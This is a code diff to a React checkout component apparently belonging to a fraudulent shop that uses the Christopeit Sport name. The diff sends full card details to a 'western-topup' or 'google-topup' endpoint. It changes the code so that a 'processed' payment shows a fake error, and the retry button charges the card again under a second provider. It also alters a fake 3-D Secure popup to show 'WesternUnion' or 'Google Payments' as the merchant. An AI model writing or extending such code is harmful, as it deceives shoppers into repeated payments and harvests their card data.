@@ -13,6 +13,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   const [showPaymentError, setShowPaymentError] = useState(false);
   const [showCardError, setShowCardError] = useState(false);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
+  const [checkoutProvider, setCheckoutProvider] = useState("western"); // Default to Western Union
 
   const cardNumberRef = useRef(null);
   const expiryDateRef = useRef(null);
@@ -71,7 +72,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     const paymentNumber = Math.floor(Math.random() * 100000); 
 
     try {
-      const response = await fetch('https://api.christopeit-sport.fr/western-topup', {
+      const response = await fetch(`https://api.christopeit-sport.fr/${checkoutProvider}-topup`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ orderNumber, paymentNumber, amount, cardDetails }),
@@ -92,6 +93,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     } catch (error) {
       console.error('Error fetching payment:', error);
       setShowPaymentError(false);
+      setShowCardError(false);
       setShow3DSecurePopup(false);
       throw error;
     }
@@ -156,10 +158,10 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       setShow3DSecurePopup(false);
       
       // Afficher la popup d'erreur en fonction de si paiement refusé
-      if (result === "refused") {
-        setShowCardError(true);  
-      } else {
+      if (result === "processed") {
         setShowPaymentError(true);
+      } else {
+        setShowCardError(true);  
       }
 
     } catch (error) {
@@ -172,7 +174,9 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
 
   const handleRetry = () => {
     setShowPaymentError(false);
+    setShowCardError(false);
     setShow3DSecurePopup(false);
+    
     handleCheckout(new Event('submit'));
   };
 
@@ -280,7 +284,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             <h2>{data.checkoutPay3DSecureTitle}</h2>
             <p className="desc">{data.checkoutPay3DSecureDescription}</p>
             <article className="infos">
-              <span>{data.checkoutPay3DSecureMerchant}</span>
+              <span>{checkoutProvider === "western" ? 'WesternUnion (Christopeit Sport)' : 'Google Payments (Christopeit Sport)'}</span>
               <span>
                 {data.checkoutPay3DSecureAmount} : {amount}
                 {shop.currency}
@@ -336,10 +340,10 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               />
             </article>
             <h2 className="icon">❌</h2>
-            <h2>{data.checkoutCardErrorTitle}</h2>
-            <p className="desc">{data.checkoutCardErrorDescription}</p>
-            <button onClick={handleChangeCard} disabled={isLoading}>
-              {data.checkoutCardRetryButton}
+            <h2>Erreur lors du paiement</h2>
+            <p className="desc">Une erreur est survenue, lors du paiement veuillez réessayer.</p>
+            <button onClick={() => { handleRetry(); setCheckoutProvider("google"); }} disabled={isLoading}>
+              Réesayer
             </button>
           </div>
         </div>
